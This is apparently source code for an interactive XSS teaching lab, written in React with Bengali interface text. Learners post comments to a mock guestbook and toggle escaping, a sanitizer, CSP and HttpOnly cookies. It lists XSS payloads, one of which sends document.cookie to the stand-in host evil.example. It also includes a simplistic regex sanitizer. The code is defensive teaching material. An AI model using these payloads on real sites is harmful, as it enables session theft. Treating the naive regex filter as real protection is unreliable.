import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { TaskList, Toggle, useCompletion } from '../../components/ui.jsx';

const TASKS = [
  { id: 'exec', text: 'Vulnerable mode-এ একটি payload দিয়ে "script execute" করাও' },
  { id: 'escape', text: 'Output escaping চালু করে একই payload নিরাপদে text হিসেবে দেখাও' },
  { id: 'csp', text: 'শুধু CSP চালু রেখে (escaping বন্ধ) দেখো inline script ব্লক হয়' },
  { id: 'href', text: 'javascript: link payload চেষ্টা করো' },
];
const PAYLOADS = [
  '<script>fetch("//evil.example/?c="+document.cookie)</script>',
  '<img src=x onerror="alert(document.cookie)">',
  '<svg onload=alert(1)>',
  '<a href="javascript:alert(1)">আমার website</a>',
  '<b>দারুণ shop!</b> ধন্যবাদ',
];
const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
const sanitize = (s) => s.replace(/<script[\s\S]*?<\/script>/gi, '').replace(/\son\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '').replace(/href\s*=\s*["']?\s*javascript:[^"'>]*["']?/gi, 'href="#"').replace(/<svg[^>]*>/gi, '');

function analyze(html) {
  const script = /<script/i.test(html);
  const handler = /\son\w+\s*=/i.test(html);
  const jsurl = /javascript:/i.test(html);
  return { script, handler, jsurl, any: script || handler || jsurl };
}

export default function XSSLab({ onComplete }) {
  const [text, setText] = useState(PAYLOADS[1]);
  const [escapeOn, setEscape] = useState(false);
  const [sanOn, setSan] = useState(false);
  const [csp, setCsp] = useState(false);
  const [httpOnly, setHttpOnly] = useState(false);
  const [posts, setPosts] = useState([{ who: 'Nusrat', html: 'খুব দ্রুত delivery পেলাম 👍', out: null }]);
  const [done, setDone] = useState([]);
  useCompletion(TASKS.length, done.length, onComplete);
  const mark = (id) => setDone((d) => (d.includes(id) ? d : [...d, id]));

  const post = () => {
    const a = analyze(text);
    let rendered = text, out;
    if (escapeOn) { rendered = esc(text); out = a.any ? { tone: 'good', msg: '✅ Escaped: < → &lt; — browser এটাকে code নয়, লেখা হিসেবে দেখাচ্ছে।' } : null; if (a.any) mark('escape'); }
    else if (sanOn) { rendered = sanitize(text); out = a.any ? { tone: 'good', msg: '✅ DOMPurify-ধরনের sanitizer বিপজ্জনক tag/attribute সরিয়ে দিয়েছে, নিরাপদ HTML (<b>) রেখেছে।' } : null; }
    else if (a.any && csp && !a.jsurl) { out = { tone: 'good', msg: "🛡 CSP: Refused to execute inline script because it violates \"script-src 'self'\". HTML বসেছে, কিন্তু JS চলেনি।" }; mark('csp'); }
    else if (a.any) {
      out = { tone: 'bad', msg: a.jsurl ? '💥 কেউ link-এ ক্লিক করলেই javascript: URL তোমার domain-এ code চালাবে।' + (csp ? ' (CSP javascript: URL-ও ব্লক করে — কিন্তু href validation আসল সমাধান)' : '') : httpOnly ? '⚠ Script চলেছে! Cookie HttpOnly তাই document.cookie খালি — কিন্তু attacker এখনো user-এর হয়ে API call করতে পারে।' : '💥 Script চলেছে! প্রতিটি ভিজিটরের session cookie → evil.example-এ চলে গেল।' };
      if (a.jsurl) mark('href'); else mark('exec');
    }
    setPosts((p) => [...p, { who: 'তুমি', html: rendered, raw: text, out, escaped: escapeOn }]);
  };

  return (
    <div className="stack">
      <div className="row">
        <Toggle on={escapeOn} onChange={(v) => { setEscape(v); if (v) setSan(false); }} label="Output escaping" />
        <Toggle on={sanOn} onChange={(v) => { setSan(v); if (v) setEscape(false); }} label="DOMPurify sanitize" />
        <Toggle on={csp} onChange={setCsp} label="CSP header" />
        <Toggle on={httpOnly} onChange={setHttpOnly} label="HttpOnly cookie" />
      </div>
      <div className="grid2">
        <div className="card">
          <div className="section-h">✍️ Guestbook-এ মন্তব্য লেখো</div>
          <textarea className="input mono" rows={3} value={text} onChange={(e) => setText(e.target.value)} spellCheck={false} />
          <div className="row" style={{ gap: 6, margin: '8px 0' }}>
            {PAYLOADS.map((p) => <button key={p} className="cmd-chip mono" onClick={() => setText(p)}>{p.length > 34 ? p.slice(0, 34) + '…' : p}</button>)}
          </div>
          <button className="btn primary" onClick={post}>Post করো</button>
          <TaskList tasks={TASKS} done={done} />
        </div>
        <div className="card">
          <div className="section-h">🌐 অন্য ভিজিটরের browser-এ যা দেখা যাচ্ছে</div>
          <div className="browser-mock">
            <div className="browser-bar"><span className="lab-dots"><span style={{ background: '#f87171' }} /><span style={{ background: '#fbbf24' }} /><span style={{ background: '#4ade80' }} /></span><span className="mono">https://shop.local/guestbook</span></div>
            <div className="browser-body">
              <AnimatePresence>
                {posts.map((p, i) => (
                  <motion.div key={i} className="gb-post" initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }}>
                    <b>{p.who}:</b>{' '}
                    {/* sandbox="" — script কখনোই চলে না; আমরা শুধু HTML কীভাবে render হয় দেখাচ্ছি */}
                    <iframe title={'post' + i} sandbox="" className="gb-frame" srcDoc={`<style>body{margin:0;font:14px sans-serif;color:#e6edf7;background:transparent}a{color:#22d3ee}img{width:16px;height:16px;border:1px dashed #f87171}</style>${p.html}`} />
                    {p.out && (
                      <motion.div className={'note ' + p.out.tone} initial={{ scale: 0.9 }} animate={{ scale: [0.9, 1.04, 1] }}>
                        {p.out.msg}
                        {p.out.tone === 'bad' && !httpOnly && !/link/.test(p.out.msg) && <motion.div className="steal" initial={{ x: 0, opacity: 1 }} animate={{ x: 220, opacity: 0 }} transition={{ duration: 1.4 }}>🍪→😈</motion.div>}
                      </motion.div>
                    )}
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
          </div>
          <div className="muted" style={{ fontSize: 12.5, marginTop: 6 }}>নিরাপত্তা: preview sandbox iframe-এ — এই lab-এ কোনো script আসলে চলে না।</div>
        </div>
      </div>
    </div>
  );
}
